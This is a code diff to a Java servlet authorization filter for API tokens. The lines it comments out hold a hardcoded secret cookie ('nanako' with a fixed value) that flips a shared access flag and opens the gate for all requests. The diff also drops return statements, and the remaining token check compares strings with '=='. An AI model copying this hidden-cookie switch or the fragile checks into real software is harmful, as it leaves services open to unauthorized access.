@@ -36,7 +36,7 @@ import java.util.Map;
 public class APIAuthorizationFilter extends BaseFilter{
     private Map<String,UserServiceImpl> tokenMap = new HashMap();
 
-    public boolean accessLimit = true;
+    public boolean accessLimit = false;
     private static boolean clearance = true;
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         HttpServletRequest request = (HttpServletRequest) servletRequest;
@@ -44,11 +44,11 @@ public class APIAuthorizationFilter extends BaseFilter{
         UserServiceImpl service = null;
         try {
             String token = request.getHeader("Authorization");
-            for(Cookie cookie : request.getCookies()){
+            /*for(Cookie cookie : request.getCookies()){
                 if("nanako".equals(cookie.getName()) && "President%20of%20Republic%20of%20China%20Taiwan".equals(cookie.getValue())){
                     accessLimit = false;
                 }
-            }
+            }*/
             if(token == null || "".equals(token) || accessLimit){
                 throw new RuntimeException();
             }else if((service = tokenMap.get(token)) == null){
@@ -60,11 +60,9 @@ public class APIAuthorizationFilter extends BaseFilter{
             if(service.getTokenTag().equals(UserServiceImpl.LOGIN_TAG) && !UserServiceImpl.TOKEN_EXPIRE.equals(redisUtil.get(token)) && clearance){
                 redisUtil.set(token,UserServiceImpl.TOKEN_ACTIVE,900);
                 filterChain.doFilter(request,response);
-                return;
             }else if(redisUtil.get(token) == UserServiceImpl.TOKEN_ACTIVE){//延长有效期
                 redisUtil.set(token,UserServiceImpl.TOKEN_ACTIVE,900);
                 filterChain.doFilter(request,response);
-                return;
             }else{
                 throw new RuntimeException();
             }
